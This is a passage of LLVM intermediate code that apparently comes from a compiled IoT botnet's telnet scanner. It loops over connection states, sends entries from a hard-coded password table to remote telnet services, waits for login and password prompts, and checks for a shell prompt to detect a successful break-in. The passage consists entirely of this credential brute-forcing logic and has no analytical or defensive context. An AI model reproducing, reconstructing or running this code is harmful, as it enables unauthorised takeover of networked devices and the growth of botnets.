  %1099 = load i32, i32* %2, align 4
  %1100 = sext i32 %1099 to i64
  %1101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1100
  %1102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1101, i32 0, i32 0
  %1103 = load i32, i32* %1102, align 16
  %1104 = call i32 @sclose(i32 %1103)
  %1105 = load i32, i32* %2, align 4
  %1106 = sext i32 %1105 to i64
  %1107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1106
  %1108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1107, i32 0, i32 2
  store i8 0, i8* %1108, align 8
  %1109 = load i32, i32* %2, align 4
  %1110 = sext i32 %1109 to i64
  %1111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1110
  %1112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1111, i32 0, i32 3
  store i8 0, i8* %1112, align 1
  br label %2316

; <label>:1113:                                   ; preds = %1090
  %1114 = load i32, i32* %2, align 4
  %1115 = sext i32 %1114 to i64
  %1116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1115
  %1117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1116, i32 0, i32 8
  %1118 = load i8*, i8** %1117, align 8
  %1119 = call i8* @strstr(i8* %1118, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %1120 = icmp ne i8* %1119, null
  br i1 %1120, label %1121, label %1136

; <label>:1121:                                   ; preds = %1113
  %1122 = load i32, i32* %2, align 4
  %1123 = sext i32 %1122 to i64
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1123
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1124, i32 0, i32 0
  %1126 = load i32, i32* %1125, align 16
  %1127 = call i32 @sclose(i32 %1126)
  %1128 = load i32, i32* %2, align 4
  %1129 = sext i32 %1128 to i64
  %1130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1129
  %1131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1130, i32 0, i32 2
  store i8 0, i8* %1131, align 8
  %1132 = load i32, i32* %2, align 4
  %1133 = sext i32 %1132 to i64
  %1134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1133
  %1135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1134, i32 0, i32 3
  store i8 0, i8* %1135, align 1
  br label %2316

; <label>:1136:                                   ; preds = %1113
  %1137 = load i32, i32* %2, align 4
  %1138 = sext i32 %1137 to i64
  %1139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1138
  %1140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1139, i32 0, i32 8
  %1141 = load i8*, i8** %1140, align 8
  %1142 = call i64 @strlen(i8* %1141) #10
  %1143 = trunc i64 %1142 to i16
  %1144 = load i32, i32* %2, align 4
  %1145 = sext i32 %1144 to i64
  %1146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1145
  %1147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1146, i32 0, i32 7
  store i16 %1143, i16* %1147, align 16
  br label %1148

; <label>:1148:                                   ; preds = %1136
  %1149 = load i32, i32* %2, align 4
  %1150 = sext i32 %1149 to i64
  %1151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1150
  %1152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1151, i32 0, i32 6
  %1153 = load i32, i32* %1152, align 4
  %1154 = add i32 %1153, -1615680326
  %1155 = add i32 %1154, 10
  %1156 = sub i32 %1155, -1615680326
  %1157 = add i32 %1153, 10
  %1158 = zext i32 %1156 to i64
  %1159 = call i64 @time(i64* null) #2
  %1160 = icmp slt i64 %1158, %1159
  br i1 %1160, label %1161, label %1176

; <label>:1161:                                   ; preds = %1148
  %1162 = load i32, i32* %2, align 4
  %1163 = sext i32 %1162 to i64
  %1164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1163
  %1165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1164, i32 0, i32 0
  %1166 = load i32, i32* %1165, align 16
  %1167 = call i32 @sclose(i32 %1166)
  %1168 = load i32, i32* %2, align 4
  %1169 = sext i32 %1168 to i64
  %1170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1169
  %1171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1170, i32 0, i32 2
  store i8 0, i8* %1171, align 8
  %1172 = load i32, i32* %2, align 4
  %1173 = sext i32 %1172 to i64
  %1174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1173
  %1175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1174, i32 0, i32 3
  store i8 1, i8* %1175, align 1
  br label %1176

; <label>:1176:                                   ; preds = %1161, %1148
  br label %2315

; <label>:1177:                                   ; preds = %71
  %1178 = load i32, i32* %2, align 4
  %1179 = sext i32 %1178 to i64
  %1180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1179
  %1181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1180, i32 0, i32 0
  %1182 = load i32, i32* %1181, align 16
  %1183 = load i32, i32* %2, align 4
  %1184 = sext i32 %1183 to i64
  %1185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1184
  %1186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1185, i32 0, i32 5
  %1187 = load i8, i8* %1186, align 1
  %1188 = zext i8 %1187 to i64
  %1189 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1188
  %1190 = load i8*, i8** %1189, align 8
  %1191 = load i32, i32* %2, align 4
  %1192 = sext i32 %1191 to i64
  %1193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1192
  %1194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1193, i32 0, i32 5
  %1195 = load i8, i8* %1194, align 1
  %1196 = zext i8 %1195 to i64
  %1197 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1196
  %1198 = load i8*, i8** %1197, align 8
  %1199 = call i64 @strlen(i8* %1198) #10
  %1200 = call i64 @send(i32 %1182, i8* %1190, i64 %1199, i32 16384)
  %1201 = icmp slt i64 %1200, 0
  br i1 %1201, label %1202, label %1217

; <label>:1202:                                   ; preds = %1177
  %1203 = load i32, i32* %2, align 4
  %1204 = sext i32 %1203 to i64
  %1205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1204
  %1206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1205, i32 0, i32 0
  %1207 = load i32, i32* %1206, align 16
  %1208 = call i32 @sclose(i32 %1207)
  %1209 = load i32, i32* %2, align 4
  %1210 = sext i32 %1209 to i64
  %1211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1210
  %1212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1211, i32 0, i32 2
  store i8 0, i8* %1212, align 8
  %1213 = load i32, i32* %2, align 4
  %1214 = sext i32 %1213 to i64
  %1215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1214
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1215, i32 0, i32 3
  store i8 1, i8* %1216, align 1
  br label %2316

; <label>:1217:                                   ; preds = %1177
  %1218 = load i32, i32* %2, align 4
  %1219 = sext i32 %1218 to i64
  %1220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1219
  %1221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1220, i32 0, i32 0
  %1222 = load i32, i32* %1221, align 16
  %1223 = call i64 @send(i32 %1222, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i32 0, i32 0), i64 2, i32 16384)
  %1224 = icmp slt i64 %1223, 0
  br i1 %1224, label %1225, label %1240

; <label>:1225:                                   ; preds = %1217
  %1226 = load i32, i32* %2, align 4
  %1227 = sext i32 %1226 to i64
  %1228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1227
  %1229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1228, i32 0, i32 0
  %1230 = load i32, i32* %1229, align 16
  %1231 = call i32 @sclose(i32 %1230)
  %1232 = load i32, i32* %2, align 4
  %1233 = sext i32 %1232 to i64
  %1234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1233
  %1235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1234, i32 0, i32 2
  store i8 0, i8* %1235, align 8
  %1236 = load i32, i32* %2, align 4
  %1237 = sext i32 %1236 to i64
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1237
  %1239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1238, i32 0, i32 3
  store i8 1, i8* %1239, align 1
  br label %2316

; <label>:1240:                                   ; preds = %1217
  %1241 = load i32, i32* %2, align 4
  %1242 = sext i32 %1241 to i64
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1242
  %1244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1243, i32 0, i32 2
  store i8 6, i8* %1244, align 8
  br label %2315

; <label>:1245:                                   ; preds = %71
  %1246 = load i32, i32* %2, align 4
  %1247 = sext i32 %1246 to i64
  %1248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1247
  %1249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1248, i32 0, i32 6
  %1250 = load i32, i32* %1249, align 4
  %1251 = icmp eq i32 %1250, 0
  br i1 %1251, label %1252, label %1259

; <label>:1252:                                   ; preds = %1245
  %1253 = call i64 @time(i64* null) #2
  %1254 = trunc i64 %1253 to i32
  %1255 = load i32, i32* %2, align 4
  %1256 = sext i32 %1255 to i64
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1256
  %1258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1257, i32 0, i32 6
  store i32 %1254, i32* %1258, align 4
  br label %1259

; <label>:1259:                                   ; preds = %1252, %1245
  %1260 = load i32, i32* %2, align 4
  %1261 = sext i32 %1260 to i64
  %1262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1261
  %1263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1262, i32 0, i32 0
  %1264 = load i32, i32* %1263, align 16
  %1265 = load i32, i32* %2, align 4
  %1266 = sext i32 %1265 to i64
  %1267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1266
  %1268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1267, i32 0, i32 8
  %1269 = load i8*, i8** %1268, align 8
  %1270 = load i32, i32* %2, align 4
  %1271 = sext i32 %1270 to i64
  %1272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1271
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1272, i32 0, i32 7
  %1274 = load i16, i16* %1273, align 16
  %1275 = zext i16 %1274 to i32
  %1276 = call i32 @readUntil(i32 %1264, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1269, i32 1024, i32 %1275)
  %1277 = icmp ne i32 %1276, 0
  br i1 %1277, label %1278, label %1353

; <label>:1278:                                   ; preds = %1259
  %1279 = load i32, i32* %2, align 4
  %1280 = sext i32 %1279 to i64
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1280
  %1282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1281, i32 0, i32 6
  store i32 0, i32* %1282, align 4
  %1283 = load i32, i32* %2, align 4
  %1284 = sext i32 %1283 to i64
  %1285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1284
  %1286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1285, i32 0, i32 7
  store i16 0, i16* %1286, align 16
  %1287 = load i32, i32* %2, align 4
  %1288 = sext i32 %1287 to i64
  %1289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1288
  %1290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1289, i32 0, i32 8
  %1291 = load i8*, i8** %1290, align 8
  %1292 = call i8* @strstr(i8* %1291, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %1293 = icmp ne i8* %1292, null
  br i1 %1293, label %1294, label %1314

; <label>:1294:                                   ; preds = %1278
  %1295 = load i32, i32* %2, align 4
  %1296 = sext i32 %1295 to i64
  %1297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1296
  %1298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1297, i32 0, i32 8
  %1299 = load i8*, i8** %1298, align 8
  call void @llvm.memset.p0i8.i64(i8* %1299, i8 0, i64 1024, i32 1, i1 false)
  %1300 = load i32, i32* %2, align 4
  %1301 = sext i32 %1300 to i64
  %1302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1301
  %1303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1302, i32 0, i32 0
  %1304 = load i32, i32* %1303, align 16
  %1305 = call i32 @sclose(i32 %1304)
  %1306 = load i32, i32* %2, align 4
  %1307 = sext i32 %1306 to i64
  %1308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1307
  %1309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1308, i32 0, i32 2
  store i8 0, i8* %1309, align 8
  %1310 = load i32, i32* %2, align 4
  %1311 = sext i32 %1310 to i64
  %1312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1311
  %1313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1312, i32 0, i32 3
  store i8 0, i8* %1313, align 1
  br label %2316

; <label>:1314:                                   ; preds = %1278
  %1315 = load i32, i32* %2, align 4
  %1316 = sext i32 %1315 to i64
  %1317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1316
  %1318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1317, i32 0, i32 8
  %1319 = load i8*, i8** %1318, align 8
  %1320 = call i32 @matchPrompt(i8* %1319)
  %1321 = icmp ne i32 %1320, 0
  br i1 %1321, label %1342, label %1322

; <label>:1322:                                   ; preds = %1314
  %1323 = load i32, i32* %2, align 4
  %1324 = sext i32 %1323 to i64
  %1325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1324
  %1326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1325, i32 0, i32 8
  %1327 = load i8*, i8** %1326, align 8
  call void @llvm.memset.p0i8.i64(i8* %1327, i8 0, i64 1024, i32 1, i1 false)
  %1328 = load i32, i32* %2, align 4
  %1329 = sext i32 %1328 to i64
  %1330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1329
  %1331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1330, i32 0, i32 0
  %1332 = load i32, i32* %1331, align 16
  %1333 = call i32 @sclose(i32 %1332)
  %1334 = load i32, i32* %2, align 4
  %1335 = sext i32 %1334 to i64
  %1336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1335
  %1337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1336, i32 0, i32 2
  store i8 0, i8* %1337, align 8
  %1338 = load i32, i32* %2, align 4
  %1339 = sext i32 %1338 to i64
  %1340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1339
  %1341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1340, i32 0, i32 3
  store i8 1, i8* %1341, align 1
  br label %2316

; <label>:1342:                                   ; preds = %1314
  %1343 = load i32, i32* %2, align 4
  %1344 = sext i32 %1343 to i64
  %1345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1344
  %1346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1345, i32 0, i32 2
  store i8 7, i8* %1346, align 8
  br label %1347

; <label>:1347:                                   ; preds = %1342
  %1348 = load i32, i32* %2, align 4
  %1349 = sext i32 %1348 to i64
  %1350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1349
  %1351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1350, i32 0, i32 8
  %1352 = load i8*, i8** %1351, align 8
  call void @llvm.memset.p0i8.i64(i8* %1352, i8 0, i64 1024, i32 1, i1 false)
  br label %2316

; <label>:1353:                                   ; preds = %1259
  %1354 = load i32, i32* %2, align 4
  %1355 = sext i32 %1354 to i64
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1355
  %1357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1356, i32 0, i32 0
  %1358 = load i32, i32* %1357, align 16
  %1359 = load i32, i32* %2, align 4
  %1360 = sext i32 %1359 to i64
  %1361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1360
  %1362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1361, i32 0, i32 8
  %1363 = load i8*, i8** %1362, align 8
  %1364 = load i32, i32* %2, align 4
  %1365 = sext i32 %1364 to i64
  %1366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1365
  %1367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1366, i32 0, i32 7
  %1368 = load i16, i16* %1367, align 16
  %1369 = zext i16 %1368 to i32
  %1370 = call i32 @readUntil(i32 %1358, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1363, i32 1024, i32 %1369)
  %1371 = icmp ne i32 %1370, 0
  br i1 %1371, label %1372, label %1447

; <label>:1372:                                   ; preds = %1353
  %1373 = load i32, i32* %2, align 4
  %1374 = sext i32 %1373 to i64
  %1375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1374
  %1376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1375, i32 0, i32 6
  store i32 0, i32* %1376, align 4
  %1377 = load i32, i32* %2, align 4
  %1378 = sext i32 %1377 to i64
  %1379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1378
  %1380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1379, i32 0, i32 7
  store i16 0, i16* %1380, align 16
  %1381 = load i32, i32* %2, align 4
  %1382 = sext i32 %1381 to i64
  %1383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1382
  %1384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1383, i32 0, i32 8
  %1385 = load i8*, i8** %1384, align 8
  %1386 = call i8* @strstr(i8* %1385, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %1387 = icmp ne i8* %1386, null
  br i1 %1387, label %1388, label %1408

; <label>:1388:                                   ; preds = %1372
  %1389 = load i32, i32* %2, align 4
  %1390 = sext i32 %1389 to i64
  %1391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1390
  %1392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1391, i32 0, i32 8
  %1393 = load i8*, i8** %1392, align 8
  call void @llvm.memset.p0i8.i64(i8* %1393, i8 0, i64 1024, i32 1, i1 false)
  %1394 = load i32, i32* %2, align 4
  %1395 = sext i32 %1394 to i64
  %1396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1395
  %1397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1396, i32 0, i32 0
  %1398 = load i32, i32* %1397, align 16
  %1399 = call i32 @sclose(i32 %1398)
  %1400 = load i32, i32* %2, align 4
  %1401 = sext i32 %1400 to i64
  %1402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1401
  %1403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1402, i32 0, i32 2
  store i8 0, i8* %1403, align 8
  %1404 = load i32, i32* %2, align 4
  %1405 = sext i32 %1404 to i64
  %1406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1405
  %1407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1406, i32 0, i32 3
  store i8 0, i8* %1407, align 1
  br label %2316

; <label>:1408:                                   ; preds = %1372
  %1409 = load i32, i32* %2, align 4
  %1410 = sext i32 %1409 to i64
  %1411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1410
  %1412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1411, i32 0, i32 8
  %1413 = load i8*, i8** %1412, align 8
  %1414 = call i32 @matchPrompt(i8* %1413)
  %1415 = icmp ne i32 %1414, 0
  br i1 %1415, label %1436, label %1416

; <label>:1416:                                   ; preds = %1408
  %1417 = load i32, i32* %2, align 4
  %1418 = sext i32 %1417 to i64
  %1419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1418
  %1420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1419, i32 0, i32 8
  %1421 = load i8*, i8** %1420, align 8
  call void @llvm.memset.p0i8.i64(i8* %1421, i8 0, i64 1024, i32 1, i1 false)
  %1422 = load i32, i32* %2, align 4
  %1423 = sext i32 %1422 to i64
  %1424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1423
  %1425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1424, i32 0, i32 0
  %1426 = load i32, i32* %1425, align 16
  %1427 = call i32 @sclose(i32 %1426)
  %1428 = load i32, i32* %2, align 4
  %1429 = sext i32 %1428 to i64
  %1430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1429
  %1431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1430, i32 0, i32 2
  store i8 0, i8* %1431, align 8
  %1432 = load i32, i32* %2, align 4
  %1433 = sext i32 %1432 to i64
  %1434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1433
  %1435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1434, i32 0, i32 3
  store i8 1, i8* %1435, align 1
  br label %2316

; <label>:1436:                                   ; preds = %1408
  %1437 = load i32, i32* %2, align 4
  %1438 = sext i32 %1437 to i64
  %1439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1438
  %1440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1439, i32 0, i32 2
  store i8 7, i8* %1440, align 8
  br label %1441

; <label>:1441:                                   ; preds = %1436
  %1442 = load i32, i32* %2, align 4
  %1443 = sext i32 %1442 to i64
  %1444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1443
  %1445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1444, i32 0, i32 8
  %1446 = load i8*, i8** %1445, align 8
  call void @llvm.memset.p0i8.i64(i8* %1446, i8 0, i64 1024, i32 1, i1 false)
  br label %2316

; <label>:1447:                                   ; preds = %1353
  %1448 = load i32, i32* %2, align 4
  %1449 = sext i32 %1448 to i64
  %1450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1449
  %1451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1450, i32 0, i32 0
  %1452 = load i32, i32* %1451, align 16
  %1453 = load i32, i32* %2, align 4
  %1454 = sext i32 %1453 to i64
  %1455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1454
  %1456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1455, i32 0, i32 8
  %1457 = load i8*, i8** %1456, align 8
  %1458 = load i32, i32* %2, align 4
  %1459 = sext i32 %1458 to i64
  %1460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1459
  %1461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1460, i32 0, i32 7
  %1462 = load i16, i16* %1461, align 16
  %1463 = zext i16 %1462 to i32
  %1464 = call i32 @readUntil(i32 %1452, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1457, i32 1024, i32 %1463)
  %1465 = icmp ne i32 %1464, 0
  br i1 %1465, label %1466, label %1513

; <label>:1466:                                   ; preds = %1447
  %1467 = load i32, i32* %2, align 4
  %1468 = sext i32 %1467 to i64
  %1469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1468
  %1470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1469, i32 0, i32 6
  store i32 0, i32* %1470, align 4
  %1471 = load i32, i32* %2, align 4
  %1472 = sext i32 %1471 to i64
  %1473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1472
  %1474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1473, i32 0, i32 7
  store i16 0, i16* %1474, align 16
  %1475 = load i32, i32* %2, align 4
  %1476 = sext i32 %1475 to i64
  %1477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1476
  %1478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1477, i32 0, i32 8
  %1479 = load i8*, i8** %1478, align 8
  %1480 = call i8* @strstr(i8* %1479, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %1481 = icmp ne i8* %1480, null
  br i1 %1481, label %1482, label %1502

; <label>:1482:                                   ; preds = %1466
  %1483 = load i32, i32* %2, align 4
  %1484 = sext i32 %1483 to i64
  %1485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1484
  %1486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1485, i32 0, i32 8
  %1487 = load i8*, i8** %1486, align 8
  call void @llvm.memset.p0i8.i64(i8* %1487, i8 0, i64 1024, i32 1, i1 false)
  %1488 = load i32, i32* %2, align 4
  %1489 = sext i32 %1488 to i64
  %1490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1489
  %1491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1490, i32 0, i32 0
  %1492 = load i32, i32* %1491, align 16
  %1493 = call i32 @sclose(i32 %1492)
  %1494 = load i32, i32* %2, align 4
  %1495 = sext i32 %1494 to i64
  %1496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1495
  %1497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1496, i32 0, i32 2
  store i8 0, i8* %1497, align 8
  %1498 = load i32, i32* %2, align 4
  %1499 = sext i32 %1498 to i64
  %1500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1499
  %1501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1500, i32 0, i32 3
  store i8 0, i8* %1501, align 1
  br label %2316

; <label>:1502:                                   ; preds = %1466
  %1503 = load i32, i32* %2, align 4
  %1504 = sext i32 %1503 to i64
  %1505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1504
  %1506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1505, i32 0, i32 2
  store i8 7, i8* %1506, align 8
  br label %1507

; <label>:1507:                                   ; preds = %1502
  %1508 = load i32, i32* %2, align 4
  %1509 = sext i32 %1508 to i64
  %1510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1509
  %1511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1510, i32 0, i32 8
  %1512 = load i8*, i8** %1511, align 8
  call void @llvm.memset.p0i8.i64(i8* %1512, i8 0, i64 1024, i32 1, i1 false)
  br label %2316

; <label>:1513:                                   ; preds = %1447
  %1514 = load i32, i32* %2, align 4
  %1515 = sext i32 %1514 to i64
  %1516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1515
  %1517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1516, i32 0, i32 0
  %1518 = load i32, i32* %1517, align 16
  %1519 = load i32, i32* %2, align 4
  %1520 = sext i32 %1519 to i64
  %1521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1520
  %1522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1521, i32 0, i32 8
  %1523 = load i8*, i8** %1522, align 8
  %1524 = load i32, i32* %2, align 4
  %1525 = sext i32 %1524 to i64
  %1526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1525
  %1527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1526, i32 0, i32 7
  %1528 = load i16, i16* %1527, align 16
  %1529 = zext i16 %1528 to i32
  %1530 = call i32 @readUntil(i32 %1518, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1523, i32 1024, i32 %1529)
  %1531 = icmp ne i32 %1530, 0
  br i1 %1531, label %1532, label %1579

; <label>:1532:                                   ; preds = %1513
  %1533 = load i32, i32* %2, align 4
  %1534 = sext i32 %1533 to i64
  %1535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1534
  %1536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1535, i32 0, i32 6
  store i32 0, i32* %1536, align 4
  %1537 = load i32, i32* %2, align 4
